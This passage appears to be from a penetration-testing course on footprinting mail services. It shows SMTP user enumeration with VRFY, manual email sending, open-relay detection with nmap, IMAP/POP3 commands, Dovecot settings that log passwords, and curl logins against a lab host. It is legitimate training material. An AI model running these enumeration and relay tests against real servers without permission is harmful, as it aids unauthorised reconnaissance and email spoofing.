<pre><code class="lang-shell-session">root@htb[/htb]$ telnet <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span> <span class="hljs-number">25</span>

Trying <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span>...
Connected to <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span>.
Escape character is '^]'.
<span class="hljs-number">220</span> ESMTP Server 


HELO mail1.inlanefreight.htb

<span class="hljs-number">250</span> mail1.inlanefreight.htb


EHLO mail1

<span class="hljs-number">250</span>-mail1.inlanefreight.htb
<span class="hljs-number">250</span>-PIPELINING
<span class="hljs-number">250</span>-SIZE <span class="hljs-number">10240000</span>
<span class="hljs-number">250</span>-ETRN
<span class="hljs-number">250</span>-ENHANCEDSTATUSCODES
<span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME
<span class="hljs-number">250</span>-DSN
<span class="hljs-number">250</span>-SMTPUTF8
<span class="hljs-number">250</span> CHUNKING
</code></pre>
<p>The command <code>VRFY</code> can be used to enumerate existing users on the system. However, this does not always work. Depending on how the SMTP server is configured, the SMTP server may issue <code>code 252</code> and confirm the existence of a user that does not exist on the system. A list of all SMTP response codes can be found <a href="https://serversmtp.com/smtp-error/">here</a>.</p>
<p><strong>Telnet - VRFY</strong></p>
<p>SMTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ telnet <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span> <span class="hljs-number">25</span>

Trying <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span>...
Connected to <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span>.
Escape character is '^]'.
<span class="hljs-number">220</span> ESMTP Server 

VRFY root

<span class="hljs-number">252</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> root


VRFY cry0l1t3

<span class="hljs-number">252</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> cry0l1t3


VRFY testuser

<span class="hljs-number">252</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> testuser


VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa

<span class="hljs-number">252</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> aaaaaaaaaaaaaaaaaaaaaaaaaaaa
</code></pre>
<p>Therefore, one should never entirely rely on the results of automatic tools. After all, they execute pre-configured commands, but none of the functions explicitly state how the administrator configures the tested server.</p>
<p>Sometimes we may have to work through a web proxy. We can also make this web proxy connect to the SMTP server. The command that we would send would then look something like this: <code>CONNECT 10.129.14.128:25 HTTP/1.0</code></p>
<p>All the commands we enter in the command line to send an email we know from every email client program like Thunderbird, Gmail, Outlook, and many others. We specify the <code>subject</code>, to whom the email should go, CC, BCC, and the information we want to share with others. Of course, the same works from the command line.</p>
<p><strong>Send an Email</strong></p>
<p>SMTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ telnet <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span> <span class="hljs-number">25</span>

Trying <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span>...
Connected <span class="hljs-keyword">to</span> <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span>.
Escape character <span class="hljs-keyword">is</span> <span class="hljs-comment">'^]'.</span>
<span class="hljs-number">220</span> ESMTP Server


EHLO inlanefreight.htb

<span class="hljs-number">250</span>-mail1.inlanefreight.htb
<span class="hljs-number">250</span>-PIPELINING
<span class="hljs-number">250</span>-SIZE <span class="hljs-number">10240000</span>
<span class="hljs-number">250</span>-ETRN
<span class="hljs-number">250</span>-ENHANCEDSTATUSCODES
<span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME
<span class="hljs-number">250</span>-DSN
<span class="hljs-number">250</span>-SMTPUTF8
<span class="hljs-number">250</span> CHUNKING


MAIL <span class="hljs-keyword">FROM</span>: &lt;cry0l1t3@inlanefreight.htb&gt;

<span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> Ok


RCPT <span class="hljs-keyword">TO</span>: &lt;mrb3n@inlanefreight.htb&gt; NOTIFY=success,failure

<span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> Ok


DATA

<span class="hljs-number">354</span> <span class="hljs-keyword">End</span> data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;

<span class="hljs-keyword">From</span>: &lt;cry0l1t3@inlanefreight.htb&gt;
<span class="hljs-keyword">To</span>: &lt;mrb3n@inlanefreight.htb&gt;
Subject: DB
<span class="hljs-built_in">Date</span>: Tue, <span class="hljs-number">28</span> Sept <span class="hljs-number">2021</span> <span class="hljs-number">16</span>:<span class="hljs-number">32</span>:<span class="hljs-number">51</span> +<span class="hljs-number">0200</span>
Hey man, I am trying <span class="hljs-keyword">to</span> access our XY-DB but the creds don<span class="hljs-comment">'t work. </span>
Did you make any changes there?
.

<span class="hljs-number">250</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> Ok: queued <span class="hljs-keyword">as</span> <span class="hljs-number">6E1</span>CF1681AB


QUIT

<span class="hljs-number">221</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> Bye
Connection closed <span class="hljs-keyword">by</span> foreign host.
</code></pre>
<p>The mail header is the carrier of a large amount of interesting information in an email. Among other things, it provides information about the sender and recipient, the time of sending and arrival, the stations the email passed on its way, the content and format of the message, and the sender and recipient.</p>
<p>Some of this information is mandatory, such as sender information and when the email was created. Other information is optional. However, the email header does not contain any information necessary for technical delivery. It is transmitted as part of the transmission protocol. Both sender and recipient can access the header of an email, although it is not visible at first glance. The structure of an email header is defined by <a href="https://datatracker.ietf.org/doc/html/rfc5322">RFC5322</a>.</p>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts. It is an SMTP server that is known and verified by all others. As a rule, the sender must authenticate himself to the relay server before using it.</p>
<p>Often, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers.</p>
<p><strong>Open Relay Configuration</strong></p>
<p>SMTP</p>
<pre><code class="lang-shell-session">mynetworks = <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span>
</code></pre>
<p>With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.</p>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>The default Nmap scripts include <code>smtp-commands</code>, which uses the <code>EHLO</code> command to list all possible commands that can be executed on the target SMTP server.</p>
<p><strong>Nmap</strong></p>
<p>SMTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo <span class="hljs-keyword">nmap</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span> -sC -sV -p25

Starting Nmap <span class="hljs-number">7.80</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2021</span>-<span class="hljs-number">09</span>-<span class="hljs-number">27</span> <span class="hljs-number">17</span>:<span class="hljs-number">56</span> CEST
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00025</span>s latency).

PORT   STATE SERVICE VERSION
<span class="hljs-number">25</span>/tcp <span class="hljs-keyword">open</span>  smtp    Postfix smtpd
|_smtp-<span class="hljs-keyword">command</span><span class="hljs-variable">s:</span> mail1.inlanefreight.htb, PIPELINING, SIZE <span class="hljs-number">10240000</span>, VRFY, ETRN, ENHANCEDSTATUSCODES, <span class="hljs-number">8</span>BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Addres<span class="hljs-variable">s:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> (VMware)

Service detection performed. Please report any incorrect results at http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">14.09</span> seconds
</code></pre>
<p>However, we can also use the <a href="https://nmap.org/nsedoc/scripts/smtp-open-relay.html">smtp-open-relay</a> NSE script to identify the target SMTP server as an open relay using 16 different tests. If we also print out the output of the scan in detail, we will also be able to see which tests the script is running.</p>
<p><strong>Nmap - Open Relay</strong></p>
<p>SMTP</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nmap <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span> -p25 --script smtp-open-relay -v

Starting Nmap <span class="hljs-number">7.80</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2021</span>-<span class="hljs-number">09</span>-<span class="hljs-number">30</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span> CEST
<span class="hljs-symbol">NSE:</span> Loaded <span class="hljs-number">1</span> scripts for scanning.
<span class="hljs-symbol">NSE:</span> Script Pre-scanning.
Initiating NSE <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>
Completed NSE <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>, <span class="hljs-number">0.</span>00s elapsed
Initiating ARP Ping Scan <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>
Scanning <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span> [<span class="hljs-number">1</span> port]
Completed ARP Ping Scan <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>, <span class="hljs-number">0.</span>06s elapsed (<span class="hljs-number">1</span> total hosts)
Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>
Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>, <span class="hljs-number">0.</span>03s elapsed
Initiating SYN Stealth Scan <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>
Scanning <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span> [<span class="hljs-number">1</span> port]
Discovered open port <span class="hljs-number">25</span>/tcp on <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>
Completed SYN Stealth Scan <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>, <span class="hljs-number">0.</span>06s elapsed (<span class="hljs-number">1</span> total ports)
<span class="hljs-symbol">NSE:</span> Script scanning <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>.
Initiating NSE <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>
Completed NSE <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>, <span class="hljs-number">0.</span>07s elapsed
Nmap scan report for <span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>
Host is <span class="hljs-meta">up</span> (<span class="hljs-number">0.</span>00020s latency).

PORT   STATE SERVICE
<span class="hljs-number">25</span>/tcp open  smtp
| smtp-open-relay: Server is an open relay (<span class="hljs-number">16</span>/<span class="hljs-number">16</span> tests)
|  MAIL FROM:&lt;&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@nmap.scanme.org&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@ESMTP&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@ESMTP&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;<span class="hljs-string">"relaytest@nmap.scanme.org"</span>&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;<span class="hljs-string">"relaytest%nmap.scanme.org"</span>&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;<span class="hljs-string">"relaytest@nmap.scanme.org"</span>@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org@ESMTP&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]:relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;@ESMTP:relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest&gt;
|  MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt;
|_ MAIL FROM:&lt;antispam@[<span class="hljs-number">10.129</span><span class="hljs-meta">.14</span><span class="hljs-meta">.128</span>]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@ESMTP&gt;
MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> (VMware)
<span class="hljs-symbol">
NSE:</span> Script Post-scanning.
Initiating NSE <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>
Completed NSE <span class="hljs-meta">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span>, <span class="hljs-number">0.</span>00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: <span class="hljs-number">1</span> <span class="hljs-built_in">IP</span> address (<span class="hljs-number">1</span> host <span class="hljs-meta">up</span>) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.48</span> seconds
           Raw packets sent: <span class="hljs-number">2</span> (72B) | Rcvd: <span class="hljs-number">2</span> (72B)
</code></pre>
<h2 id="imap-pop3">IMAP / POP3</h2>
<hr>
<p>With the help of the <code>Internet Message Access Protocol</code> (<code>IMAP</code>), access to emails from a mail server is possible. Unlike the <code>Post Office Protocol</code> (<code>POP3</code>), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.</p>
<p>Clients access these structures online and can create local copies. Even across several clients, this results in a uniform database. Emails remain on the server until they are deleted. IMAP is text-based and has extended functions, such as browsing emails directly on the server. It is also possible for several users to access the email server simultaneously. Without an active connection to the server, managing emails is impossible. However, some clients offer an offline mode with a local copy of the mailbox. The client synchronizes all offline local changes when a connection is reestablished.</p>
<p>The client establishes the connection to the server via port <code>143</code>. For communication, it uses text-based commands in <code>ASCII</code> format. Several commands can be sent in succession without waiting for confirmation from the server. Later confirmations from the server can be assigned to the individual commands using the identifiers sent along with the commands. Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.</p>
<p>SMTP is usually used to send emails. By copying sent emails into an IMAP folder, all clients have access to all sent mails, regardless of the computer from which they were sent. Another advantage of the Internet Message Access Protocol is creating personal folders and folder structures in the mailbox. This feature makes the mailbox clearer and easier to manage. However, the storage space requirement on the email server increases.</p>
<p>Without further measures, IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plain text. Many email servers require establishing an encrypted IMAP session to ensure greater security in email traffic and prevent unauthorized access to mailboxes. SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port <code>143</code> or an alternative port such as <code>993</code>.</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>Both IMAP and POP3 have a large number of configuration options, making it difficult to deep dive into each component in more detail. If you wish to examine these protocol configurations deeper, we recommend creating a VM locally and install the two packages <code>dovecot-imapd</code>, and <code>dovecot-pop3d</code> using <code>apt</code> and play around with the configurations and experiment.</p>
<p>In the documentation of Dovecot, we can find the individual <a href="https://doc.dovecot.org/settings/core/">core settings</a> and <a href="https://doc.dovecot.org/configuration\_manual/service\_configuration/">service configuration</a> options that can be utilized for our experiments. However, let us look at the list of commands and see how we can directly interact and communicate with IMAP and POP3 using the command line.</p>
<p><strong>IMAP Commands</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1 LOGIN username password</code></td>
<td>User&#39;s login.</td>
</tr>
<tr>
<td><code>1 LIST &quot;&quot; *</code></td>
<td>Lists all directories.</td>
</tr>
<tr>
<td><code>1 CREATE &quot;INBOX&quot;</code></td>
<td>Creates a mailbox with a specified name.</td>
</tr>
<tr>
<td><code>1 DELETE &quot;INBOX&quot;</code></td>
<td>Deletes a mailbox.</td>
</tr>
<tr>
<td><code>1 RENAME &quot;ToRead&quot; &quot;Important&quot;</code></td>
<td>Renames a mailbox.</td>
</tr>
<tr>
<td><code>1 LSUB &quot;&quot; *</code></td>
<td>Returns a subset of names from the set of names that the User has declared as being <code>active</code> or <code>subscribed</code>.</td>
</tr>
<tr>
<td><code>1 SELECT INBOX</code></td>
<td>Selects a mailbox so that messages in the mailbox can be accessed.</td>
</tr>
<tr>
<td><code>1 UNSELECT INBOX</code></td>
<td>Exits the selected mailbox.</td>
</tr>
<tr>
<td><code>1 FETCH &lt;ID&gt; all</code></td>
<td>Retrieves data associated with a message in the mailbox.</td>
</tr>
<tr>
<td><code>1 CLOSE</code></td>
<td>Removes all messages with the <code>Deleted</code> flag set.</td>
</tr>
<tr>
<td><code>1 LOGOUT</code></td>
<td>Closes the connection with the IMAP server.</td>
</tr>
</tbody>
</table>
<p><strong>POP3 Commands</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>USER username</code></td>
<td>Identifies the user.</td>
</tr>
<tr>
<td><code>PASS password</code></td>
<td>Authentication of the user using its password.</td>
</tr>
<tr>
<td><code>STAT</code></td>
<td>Requests the number of saved emails from the server.</td>
</tr>
<tr>
<td><code>LIST</code></td>
<td>Requests from the server the number and size of all emails.</td>
</tr>
<tr>
<td><code>RETR id</code></td>
<td>Requests the server to deliver the requested email by ID.</td>
</tr>
<tr>
<td><code>DELE id</code></td>
<td>Requests the server to delete the requested email by ID.</td>
</tr>
<tr>
<td><code>CAPA</code></td>
<td>Requests the server to display the server capabilities.</td>
</tr>
<tr>
<td><code>RSET</code></td>
<td>Requests the server to reset the transmitted information.</td>
</tr>
<tr>
<td><code>QUIT</code></td>
<td>Closes the connection with the POP3 server.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:</p>
<table>
<thead>
<tr>
<th><strong>Setting</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>auth_debug</code></td>
<td>Enables all authentication debug logging.</td>
</tr>
<tr>
<td><code>auth_debug_passwords</code></td>
<td>This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.</td>
</tr>
<tr>
<td><code>auth_verbose</code></td>
<td>Logs unsuccessful authentication attempts and their reasons.</td>
</tr>
<tr>
<td><code>auth_verbose_passwords</code></td>
<td>Passwords used for authentication are logged and can also be truncated.</td>
</tr>
<tr>
<td><code>auth_anonymous_username</code></td>
<td>This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>By default, ports <code>110</code>, <code>143</code>, <code>993</code>, and <code>995</code> are used for IMAP and POP3. The two higher ports use <code>TLS/SSL</code> to encrypt the communication between client and server. Using Nmap, we can scan the server for these ports. The scan will return the corresponding information like what we see below if the server uses an embedded SSL certificate.</p>
<p><strong>Nmap</strong></p>
<p>IMAP / POP3</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo nmap <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span> -sV -p110,<span class="hljs-number">143</span>,<span class="hljs-number">993</span>,<span class="hljs-number">995</span> -sC

Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2021-09-19 22:09 CEST</span>
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span>
Host is up (<span class="hljs-number">0.00026</span>s latency).

PORT    STATE SERVICE  VERSION
<span class="hljs-number">110</span>/tcp open  pop3     Dovecot pop3d
|_pop3-<span class="hljs-string">capabilities:</span> AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-<span class="hljs-string">cert:</span> <span class="hljs-string">Subject:</span> commonName=mail1.inlanefreight.htb<span class="hljs-regexp">/organizationName=Inlanefreight/</span>stateOrProvinceName=California/countryName=US
| Not valid <span class="hljs-string">before:</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-19</span><span class="hljs-string">T19:</span><span class="hljs-number">44</span>:<span class="hljs-number">58</span>
|_Not valid <span class="hljs-string">after:</span>  <span class="hljs-number">2295</span><span class="hljs-number">-07</span><span class="hljs-number">-04</span><span class="hljs-string">T19:</span><span class="hljs-number">44</span>:<span class="hljs-number">58</span>
<span class="hljs-number">143</span>/tcp open  imap     Dovecot imapd
|_imap-<span class="hljs-string">capabilities:</span> more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-<span class="hljs-string">cert:</span> <span class="hljs-string">Subject:</span> commonName=mail1.inlanefreight.htb<span class="hljs-regexp">/organizationName=Inlanefreight/</span>stateOrProvinceName=California/countryName=US
| Not valid <span class="hljs-string">before:</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-19</span><span class="hljs-string">T19:</span><span class="hljs-number">44</span>:<span class="hljs-number">58</span>
|_Not valid <span class="hljs-string">after:</span>  <span class="hljs-number">2295</span><span class="hljs-number">-07</span><span class="hljs-number">-04</span><span class="hljs-string">T19:</span><span class="hljs-number">44</span>:<span class="hljs-number">58</span>
<span class="hljs-number">993</span><span class="hljs-regexp">/tcp open  ssl/</span>imap Dovecot imapd
|_imap-<span class="hljs-string">capabilities:</span> more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-<span class="hljs-string">cert:</span> <span class="hljs-string">Subject:</span> commonName=mail1.inlanefreight.htb<span class="hljs-regexp">/organizationName=Inlanefreight/</span>stateOrProvinceName=California/countryName=US
| Not valid <span class="hljs-string">before:</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-19</span><span class="hljs-string">T19:</span><span class="hljs-number">44</span>:<span class="hljs-number">58</span>
|_Not valid <span class="hljs-string">after:</span>  <span class="hljs-number">2295</span><span class="hljs-number">-07</span><span class="hljs-number">-04</span><span class="hljs-string">T19:</span><span class="hljs-number">44</span>:<span class="hljs-number">58</span>
<span class="hljs-number">995</span><span class="hljs-regexp">/tcp open  ssl/</span>pop3 Dovecot pop3d
|_pop3-<span class="hljs-string">capabilities:</span> AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-<span class="hljs-string">cert:</span> <span class="hljs-string">Subject:</span> commonName=mail1.inlanefreight.htb<span class="hljs-regexp">/organizationName=Inlanefreight/</span>stateOrProvinceName=California/countryName=US
| Not valid <span class="hljs-string">before:</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-19</span><span class="hljs-string">T19:</span><span class="hljs-number">44</span>:<span class="hljs-number">58</span>
|_Not valid <span class="hljs-string">after:</span>  <span class="hljs-number">2295</span><span class="hljs-number">-07</span><span class="hljs-number">-04</span><span class="hljs-string">T19:</span><span class="hljs-number">44</span>:<span class="hljs-number">58</span>
MAC <span class="hljs-string">Address:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> (VMware)

Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">12.74</span> seconds
</code></pre>
<p>For example, from the output, we can see that the common name is <code>mail1.inlanefreight.htb</code>, and the email server belongs to the organization <code>Inlanefreight</code>, which is located in California. The displayed capabilities show us the commands available on the server and for the service on the corresponding port.</p>
<p>If we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages.</p>
<p><strong>cURL</strong></p>
<p>IMAP / POP3</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ curl -k <span class="hljs-string">'imaps://10.129.14.128'</span> --user user:p4ssw0rd

* LIST (\HasNoChildren) <span class="hljs-string">"."</span> Important
* LIST (\HasNoChildren) <span class="hljs-string">"."</span> INBOX
</code></pre>
<p>If we also use the <code>verbose</code> (<code>-v</code>) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server.</p>
<p>IMAP / POP3</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -k 'imaps:<span class="hljs-comment">//10.129.14.128' --user cry0l1t3:1234 -v</span>

<span class="hljs-comment">*   Trying 10.129.14.128:993...</span>
<span class="hljs-comment">* TCP_NODELAY set</span>
<span class="hljs-comment">* Connected to 10.129.14.128 (10.129.14.128) port 993 (#0)</span>
<span class="hljs-comment">* successfully set certificate verify locations:</span>
<span class="hljs-comment">*   CAfile: /etc/ssl/certs/ca-certificates.crt</span>
  CApath: /etc/ssl/certs
<span class="hljs-comment">* TLSv1.3 (OUT), TLS handshake, Client hello (1):</span>
<span class="hljs-comment">* TLSv1.3 (IN), TLS handshake, Server hello (2):</span>
<span class="hljs-comment">* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):</span>
<span class="hljs-comment">* TLSv1.3 (IN), TLS handshake, Certificate (11):</span>
<span class="hljs-comment">* TLSv1.3 (IN), TLS handshake, CERT verify (15):</span>
<span class="hljs-comment">* TLSv1.3 (IN), TLS handshake, Finished (20):</span>
